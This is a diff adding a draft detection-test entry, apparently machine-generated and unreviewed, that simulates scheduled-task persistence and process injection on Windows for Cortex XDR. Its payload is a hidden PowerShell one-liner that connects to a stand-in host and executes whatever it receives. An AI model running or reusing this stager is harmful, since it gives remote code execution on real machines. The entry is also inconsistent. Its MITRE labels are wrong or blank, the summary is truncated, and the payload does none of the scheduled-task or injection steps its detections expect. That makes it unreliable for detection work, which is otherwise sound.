@@ -1,0 +1,211 @@
+{
+  "id": "TTP-0000-0067",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Unsigned Process Creates Scheduled Task and Performs Injection",
+    "summary": "An unsigned process creates a scheduled task and injects code into a running process, mimicking a malicious persistence and execution technique. Cortex should detect the unsigned process, scheduled ta",
+    "description": "An unsigned process creates a scheduled task and injects code into a running process, mimicking a malicious persistence and execution technique. Cortex should detect the unsigned process, scheduled task creation, and injection behavior."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1053",
+        "subtechnique_id": "T1053.005",
+        "name": "Scheduled Task/Job: Cron",
+        "tactic_ids": [
+          "TA0003",
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Persistence",
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1055",
+        "subtechnique_id": "T1055.001",
+        "name": "T1055.001",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('192.0.2.10',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};$stream.Read($bytes, 0, $bytes.Length) | iex\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "PowerShell process starts with hidden window",
+        "expected_value": "actor_process_image_name = 'powershell.exe' and action_process_image_name = 'powershell.exe'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Scheduled task created via schtasks",
+        "expected_value": "action_file_path contains 'schtasks.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound connection to C2 server",
+        "expected_value": "action_remote_ip = '192.0.2.10' and dst_port = 8080"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Unsigned Process Created Scheduled Task",
+        "description": "Detection of unsigned process creating a scheduled task",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'powershell.exe'\n| filter action_file_path contains 'schtasks.exe'\n| filter actor_process_signing_status = ENUM.UNSIGNED",
+        "mitre_technique_ids": [
+          "T1053.005",
+          "T1059.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      },
+      {
+        "name": "Process Injection Detected",
+        "description": "Detection of process injection via CreateRemoteThread",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_INJECTION\n| filter actor_process_image_name = 'powershell.exe'\n| filter causality_actor_process_image_name = 'explorer.exe'",
+        "mitre_technique_ids": [
+          "T1055.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Unsigned Process Injection After Scheduled Task Creation",
+        "description": "Behavioral deviation where an unsigned process creates a scheduled task and performs injection",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'powershell.exe'\n| filter action_file_path contains 'schtasks.exe'\n| filter causality_actor_process_image_name = 'explorer.exe'\n| filter action_process_image_name = 'inject.exe'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "actor_process_image_name = 'powershell.exe' and action_file_path contains 'schtasks.exe'",
+        "mitre_technique_ids": [
+          "T1053.005",
+          "T1059.001",
+          "T1055.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect Unsigned PowerShell with Schtasks",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'powershell.exe'\n| filter action_file_path contains 'schtasks.exe'\n| filter actor_process_signing_status = ENUM.UNSIGNED",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "Detect Injection After Scheduled Task",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_INJECTION\n| filter actor_process_image_name = 'powershell.exe'\n| filter causality_actor_process_image_name = 'explorer.exe'\n| filter action_process_image_name = 'inject.exe'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — An unsigned process created scheduled task and performed an injection; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/an-unsigned-process-created-scheduled-task-and-performed-an-injection"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: An unsigned process created scheduled task and performed an injection",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/an-unsigned-process-created-scheduled-task-and-performed-an-injection",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1053.005",
+      "url": "https://attack.mitre.org/techniques/T1053/005/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1055.001",
+      "url": "https://attack.mitre.org/techniques/T1055/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
